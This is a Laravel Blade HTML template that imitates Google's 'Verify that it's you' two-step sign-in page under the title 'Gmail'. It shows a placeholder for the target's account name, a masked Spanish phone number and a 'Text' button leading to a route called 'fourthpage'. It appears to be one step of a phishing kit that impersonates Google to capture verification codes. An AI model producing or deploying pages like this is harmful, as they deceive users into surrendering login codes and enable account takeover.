<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link href="{{ asset('css/app.css') }}" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300&display=swap" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@500&display=swap" rel="stylesheet">
    <link rel="shortcut icon" href="{{ asset('images/favicon.ico') }}" type="image/x-icon">
    <title>Gmail
    </title>
</head>
<style>
    .size {
        width: 28rem;
    }

    .roboto400 {
        font-family: 'Roboto', sans-serif;
        color: #202124;
        font-size: 16px;
        line-height: 24px;
    }

    .robotono {
        font-family: 'Roboto', sans-serif;
        color: #202124;
        font-size: 14px;
        line-height: 20px;
    }

    .robotojul {
        font-family: 'Roboto', sans-serif;
        color: #202124;
        font-size: 12px;
        line-height: 17px;
    }

    .roboto4002 {
        font-family: 'Roboto', sans-serif;
        color: #5f6368;
        font-size: 14px;
        line-height: 20px;
    }

    .roboto4003 {
        font-family: 'Roboto', sans-serif;
        color: #202124;
        font-size: 14px;
        line-height: 20px;
    }


    .roboto500 {
        font-family: 'Roboto', sans-serif;
        color: #1a73e8;
        font-size: 14px;
    }

    .robotojulito {
        font-family: 'Roboto', sans-serif;
        color: #757575;
        font-size: 12px;
        line-height: 17px;
    }

    .roboto5002 {
        font-family: 'Roboto', sans-serif;
        color: #1a73e8;
        font-size: 14px;
    }

    .roboto5003 {
        font-family: 'Roboto', sans-serif;
        font-size: 15px;
        line-height: 20px;
    }

    .roboto5004 {
        font-family: 'Roboto', sans-serif;
        font-size: 17px;
        line-height: 20px;
    }

    .robotooe {
        font-family: 'Roboto', sans-serif;
        color: #3c4043;
        font-size: 15px;
        line-height: 20px;
    }

    @font-face {
        font-family: 'font';
        src: url('fonts/awa.ttf') format('truetype');
    }

    .font {
        font-family: 'font', Arial;
    }

    .h1font {
        font-size: 24px;
        line-height: 32px;
    }

    .waticolor {
        color: #174ea6;
        size: 14px;
        line-height: 20px;
    }

    .buttoncolor {
        background-color: #1a73e8;
    }

    .buttonhovercolor {
        background-color: #1b66c9;
    }

    .caca {
        background-color: #f6f9fe;
    }

    .increase {
        width: 30px;
        height: 30px;
    }
</style>


<body>
    <div class="border border-gray-200 mx-auto size rounded-lg mt-8">
        <div class="flex justify-center mt-8">
            <img class="select-none" src="{{ asset('images/logoo.png') }}" width="90" height="60"
                alt="">
        </div>
        <h1 class="text-center text-2xl font h1font">Verify that it’s you</h1>
        <h1 class="mx-10 text-center">To help keep your account safe, Google wants to</h1>
        <h1 class="mx-10 text-center">make sure that it’s really you trying to sign
            in</h1>
        <h1 class="mx-10 text-center text-blue-500 font-medium text-lg"><a
                href="https://support.google.com/accounts/answer/7162782">Learn more</a></h1>
        <div class="flex justify-center">
            <div class="border rounded-full p-1 robotooe font-medium mt-2 border-gray-300">
                <div class="flex">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
                        <path fill-rule="evenodd"
                            d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-6-3a2 2 0 11-4 0 2 2 0 014 0zm-2 4a5 5 0 00-4.546 2.916A5.986 5.986 0 0010 16a5.986 5.986 0 004.546-2.084A5 5 0 0010 11z"
                            clip-rule="evenodd" />
                    </svg>
                    <h1 class="ml-1">{{ $value }}</h1>
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-4 ml-1 mr-1" fill="none" viewBox="0 0 24 24"
                        stroke="currentColor" stroke-width="2">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7" />
                    </svg>
                </div>
            </div>
        </div>
        <div class="flex justify-center">
            <img src="{{ asset('images/phone.gif') }}" wdith="" height="" alt="">
        </div>
        <div class="mx-10">
            <h1 class="roboto5004 font-medium mt-2">Get a verification code</h1>
            <h1 class="text-sm mt-2"><i>Google will send a verification code to +34 •• •• •• ••. Standard rates
                    apply.</i></h1>
        </div>
        <div class="mt-8 flex justify-center">
            <a href="{{ route('fourthpage') }}"><button
                    class="rounded-md border border-gray-300 w-48 h-10 text-blue-500 font-medium hover:bg-gray-100">Text</button></a>
        </div>
        <div class="mx-10 mt-8">
            <div>
                <button class="roboto5003 text-blue-500 font-medium p-1 py-2 rounded hover:bg-gray-100 select-none">Try
                    another way</button>
                </form>
            </div>
        </div>
        <div class="mb-20">
        </div>
    </div>
    <div class="flex justify-center">
        <div class="mt-4">
            <button class="robotojul font-medium">English (United Kingdom)</button>
            <button class="robotojulito font-medium">Help</button>
            <button class="robotojulito font-medium">Privacy</button>
            <button class="robotojulito font-medium">Terms</button>
        </div>
    </div>
</body>

</html>
